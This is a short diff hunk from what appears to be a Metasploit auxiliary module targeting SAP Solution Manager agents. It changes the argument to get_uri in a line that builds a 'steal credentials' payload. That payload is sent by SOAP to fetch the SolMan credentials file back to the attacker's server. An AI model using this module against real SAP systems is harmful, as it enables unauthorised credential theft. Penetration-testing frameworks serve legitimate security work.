@@ -253,7 +253,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       }
     )
-    @creds_payload = make_steal_credentials_payload(agent[:instanceName], "#{get_uri(cli)}/#{@script_name}")
+    @creds_payload = make_steal_credentials_payload(agent[:instanceName], "#{get_uri}/#{@script_name}")
     print_status("Start script: #{@script_name} with payload for retrieving SolMan credentials file from agent: #{@agent_name}")
     send_soap_request(make_soap_body(@agent_name, @script_name, @creds_payload))
 
